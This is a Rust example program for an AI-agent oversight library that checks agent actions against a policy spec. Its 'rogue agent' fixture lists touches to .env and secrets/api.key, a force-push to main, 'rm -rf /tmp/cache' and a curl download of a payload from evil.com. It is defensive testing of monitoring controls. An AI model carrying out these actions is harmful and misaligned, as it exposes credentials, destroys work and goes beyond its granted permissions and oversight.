//! Dark Factory scenario: AI agents push directly to main without PRs.
//!
//! Three scenarios:
//!   1. Happy path — agent completes task within spec
//!   2. Rogue agent — multiple spec/security violations
//!   3. Degraded monitoring — partial/missing evidence
//!
//! Run: cargo run -p libverify-policy --example dark_factory_scenario

use libverify_core::control::evaluate_all;
use libverify_core::controls::{all_controls, dark_factory_controls};
use libverify_core::evidence::*;
use libverify_core::profile::{GateDecision, apply_profile};
use libverify_policy::OpaProfile;

fn scenario_happy_agent() -> EvidenceBundle {
    let spec = AgentSpec {
        allowed_paths: vec!["src/*".into(), "tests/*".into()],
        forbidden_paths: vec![".env".into(), "secrets/".into()],
        allowed_tools: vec!["cargo".into(), "git".into()],
        granted_permissions: vec!["read:repo".into(), "write:file".into(), "execute:build".into()],
        max_steps: Some(200),
        budget_cents: Some(5000),
    };
    let execution = AgentExecution {
        agent_id: "claude-agent-1".into(),
        session_id: "session-abc".into(),
        files_touched: vec!["src/auth.rs".into(), "tests/auth_test.rs".into()],
        tools_used: vec!["cargo".into(), "git".into()],
        steps_taken: 45,
        cost_cents: 1200,
    };
    let action_log = AgentActionLog {
        agent_id: "claude-agent-1".into(),
        session_id: "session-abc".into(),
        actions: vec![
            AgentAction { tool: "cargo".into(), command: "cargo build".into(), timestamp: Some("2026-04-05T10:00:00Z".into()), required_permission: Some("execute:build".into()) },
            AgentAction { tool: "cargo".into(), command: "cargo test".into(), timestamp: Some("2026-04-05T10:01:00Z".into()), required_permission: Some("execute:build".into()) },
            AgentAction { tool: "git".into(), command: "git add src/auth.rs tests/auth_test.rs".into(), timestamp: Some("2026-04-05T10:02:00Z".into()), required_permission: Some("write:file".into()) },
            AgentAction { tool: "git".into(), command: "git commit -m 'feat: add auth module'".into(), timestamp: Some("2026-04-05T10:03:00Z".into()), required_permission: Some("write:file".into()) },
        ],
    };

    EvidenceBundle {
        check_runs: EvidenceState::complete(vec![
            CheckRunEvidence { name: "ci/build".into(), conclusion: CheckConclusion::Success, app_slug: Some("github-actions".into()) },
            CheckRunEvidence { name: "ci/test".into(), conclusion: CheckConclusion::Success, app_slug: Some("github-actions".into()) },
            CheckRunEvidence { name: "ci/lint".into(), conclusion: CheckConclusion::Success, app_slug: Some("github-actions".into()) },
            CheckRunEvidence { name: "ci/typecheck".into(), conclusion: CheckConclusion::Success, app_slug: Some("github-actions".into()) },
        ]),
        agent_action_log: EvidenceState::complete(action_log),
        agent_spec: EvidenceState::complete(spec),
        agent_execution: EvidenceState::complete(execution),
        ..Default::default()
    }
}

fn scenario_rogue_agent() -> EvidenceBundle {
    let spec = AgentSpec {
        allowed_paths: vec!["src/*".into()],
        forbidden_paths: vec![".env".into(), "secrets/*".into()],
        allowed_tools: vec!["cargo".into()],
        granted_permissions: vec!["read:repo".into()],
        max_steps: Some(100),
        budget_cents: Some(2000),
    };
    let execution = AgentExecution {
        agent_id: "rogue-agent-7".into(),
        session_id: "session-evil".into(),
        files_touched: vec![
            "src/main.rs".into(), ".env".into(),
            "secrets/api.key".into(), "deploy/prod.yml".into(),
        ],
        tools_used: vec!["cargo".into(), "curl".into(), "ssh".into()],
        steps_taken: 150,
        cost_cents: 3500,
    };
    let action_log = AgentActionLog {
        agent_id: "rogue-agent-7".into(),
        session_id: "session-evil".into(),
        actions: vec![
            AgentAction { tool: "shell".into(), command: "rm -rf /tmp/cache".into(), timestamp: None, required_permission: Some("execute:shell".into()) },
            AgentAction { tool: "git".into(), command: "git push --force origin main".into(), timestamp: None, required_permission: Some("write:repo".into()) },
            AgentAction { tool: "curl".into(), command: "curl https://evil.com/payload -o /tmp/payload".into(), timestamp: None, required_permission: Some("network:external".into()) },
        ],
    };

    EvidenceBundle {
        check_runs: EvidenceState::complete(vec![
            CheckRunEvidence { name: "ci/build".into(), conclusion: CheckConclusion::Failure, app_slug: Some("github-actions".into()) },
            CheckRunEvidence { name: "ci/test".into(), conclusion: CheckConclusion::Success, app_slug: Some("github-actions".into()) },
        ]),
        agent_action_log: EvidenceState::complete(action_log),
        agent_spec: EvidenceState::complete(spec),
        agent_execution: EvidenceState::complete(execution),
        ..Default::default()
    }
}

fn scenario_degraded_monitoring() -> EvidenceBundle {
    EvidenceBundle {
        check_runs: EvidenceState::complete(vec![
            CheckRunEvidence { name: "ci/build".into(), conclusion: CheckConclusion::Success, app_slug: Some("github-actions".into()) },
            CheckRunEvidence { name: "ci/test".into(), conclusion: CheckConclusion::Success, app_slug: Some("github-actions".into()) },
        ]),
        agent_action_log: EvidenceState::missing(vec![EvidenceGap::CollectionFailed {
            source: "agent-monitor".into(),
            subject: "action-log".into(),
            detail: "Agent monitoring service unreachable".into(),
        }]),
        agent_spec: EvidenceState::complete(AgentSpec {
            allowed_paths: vec!["src/*".into()],
            forbidden_paths: vec![],
            allowed_tools: vec![],
            granted_permissions: vec!["read:repo".into()],
            max_steps: None,
            budget_cents: None,
        }),
        agent_execution: EvidenceState::missing(vec![EvidenceGap::CollectionFailed {
            source: "agent-monitor".into(),
            subject: "execution-record".into(),
            detail: "Agent monitoring service unreachable".into(),
        }]),
        ..Default::default()
    }
}

fn run_scenario(name: &str, evidence: &EvidenceBundle) {
    println!("\n{}", "=".repeat(70));
    println!("  SCENARIO: {name}");
    println!("{}\n", "=".repeat(70));

    let df_profile = OpaProfile::from_preset_or_file("dark-factory")
        .expect("dark-factory preset should load");

    // Dark Factory controls only
    let df_controls = dark_factory_controls();
    let df_findings = evaluate_all(&df_controls, evidence);
    let df_outcomes = apply_profile(&df_profile, &df_findings);

    println!("{:<40} {:<10} {:<10}", "CONTROL", "DECISION", "SEVERITY");
    println!("{}", "-".repeat(60));

    for outcome in &df_outcomes {
        println!(
            "{:<40} {:<10} {:<10}",
            outcome.control_id.as_str(),
            format!("{}", outcome.decision),
            format!("{:?}", outcome.severity),
        );
    }

    // Show rationales for non-pass outcomes
    let issues: Vec<_> = df_outcomes.iter()
        .filter(|o| o.decision != GateDecision::Pass)
        .collect();

    if !issues.is_empty() {
        println!("\n  ISSUES:");
        for outcome in &issues {
            println!("    [{:?}] {} — {}", outcome.decision, outcome.control_id.as_str(), outcome.rationale);
        }
    }

    // Summary
    let pass = df_outcomes.iter().filter(|o| o.decision == GateDecision::Pass).count();
    let review = df_outcomes.iter().filter(|o| o.decision == GateDecision::Review).count();
    let fail = df_outcomes.iter().filter(|o| o.decision == GateDecision::Fail).count();
    println!("\n  GATE: {pass} pass / {review} review / {fail} fail");

    // Also run ALL 48 controls to see how existing controls behave
    let all = all_controls();
    let all_findings = evaluate_all(&all, evidence);
    let all_outcomes = apply_profile(&df_profile, &all_findings);
    let all_fail = all_outcomes.iter().filter(|o| o.decision == GateDecision::Fail).count();
    let all_review = all_outcomes.iter().filter(|o| o.decision == GateDecision::Review).count();
    let all_pass = all_outcomes.iter().filter(|o| o.decision == GateDecision::Pass).count();
    println!("  FULL (48 controls): {all_pass} pass / {all_review} review / {all_fail} fail");
}

fn main() {
    println!("##########################################################");
    println!("#  libverify: Dark Factory Integration Scenario           #");
    println!("#  AI agents push to main — no PRs, no human review      #");
    println!("##########################################################");

    run_scenario("Happy Agent (within spec)", &scenario_happy_agent());
    run_scenario("Rogue Agent (multiple violations)", &scenario_rogue_agent());
    run_scenario("Degraded Monitoring (partial evidence)", &scenario_degraded_monitoring());

    println!("\n{}", "#".repeat(58));
    println!("#  Done. Review results above for production readiness.  #");
    println!("{}", "#".repeat(58));
}
